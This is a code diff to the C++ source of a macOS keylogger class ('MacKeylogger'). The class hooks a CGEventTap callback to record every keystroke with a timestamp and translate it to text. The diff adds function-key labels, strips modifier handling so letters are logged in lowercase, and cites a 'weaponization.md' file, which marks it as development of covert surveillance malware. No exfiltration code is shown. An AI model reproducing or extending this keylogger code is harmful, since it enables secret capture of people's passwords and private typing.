@@ -12,7 +12,7 @@
 
 // ---- key translation -------------------------------------------------------
 
-static std::string translateKeyCode(CGKeyCode keyCode, CGEventFlags flags) {
+static std::string translateKeyCode(CGKeyCode keyCode) {
     switch (keyCode) {
         case kVK_Space:          return "[SPACE]";
         case kVK_Return:         return "[ENTER]";
@@ -38,6 +38,18 @@ static std::string translateKeyCode(CGKeyCode keyCode, CGEventFlags flags) {
         case kVK_Command:
         case kVK_RightCommand:   return "[CMD]";
         case kVK_Function:       return "[FN]";
+        case kVK_F1:             return "[F1]";
+        case kVK_F2:             return "[F2]";
+        case kVK_F3:             return "[F3]";
+        case kVK_F4:             return "[F4]";
+        case kVK_F5:             return "[F5]";
+        case kVK_F6:             return "[F6]";
+        case kVK_F7:             return "[F7]";
+        case kVK_F8:             return "[F8]";
+        case kVK_F9:             return "[F9]";
+        case kVK_F10:            return "[F10]";
+        case kVK_F11:            return "[F11]";
+        case kVK_F12:            return "[F12]";
         default: break;
     }
 
@@ -60,10 +72,8 @@ static std::string translateKeyCode(CGKeyCode keyCode, CGEventFlags flags) {
     const UCKeyboardLayout* layout =
         reinterpret_cast<const UCKeyboardLayout*>(CFDataGetBytePtr(layoutData));
 
-    UInt32 modState = 0;
-    if (flags & kCGEventFlagMaskShift)      modState |= (shiftKey >> 8);
-    if (flags & kCGEventFlagMaskAlphaShift) modState |= (alphaLock >> 8);
-
+    // Zero modifier state → always lowercase; see weaponization.md
+    UInt32 modState     = 0;
     UInt32 deadKeyState = 0;
     UniChar chars[4] = {};
     UniCharCount len = 0;
@@ -101,13 +111,12 @@ CGEventRef MacKeylogger::tapCallback(CGEventTapProxy, CGEventType type,
         return event;
     }
 
-    CGKeyCode    keyCode = static_cast<CGKeyCode>(
+    CGKeyCode keyCode = static_cast<CGKeyCode>(
         CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode));
-    CGEventFlags flags   = CGEventGetFlags(event);
 
     KeyEvent ev;
     ev.virtualKey  = keyCode;
-    ev.translated  = translateKeyCode(keyCode, flags);
+    ev.translated  = translateKeyCode(keyCode);
     ev.timestampMs = static_cast<int64_t>(
         std::chrono::duration_cast<std::chrono::milliseconds>(
             std::chrono::system_clock::now().time_since_epoch()).count());
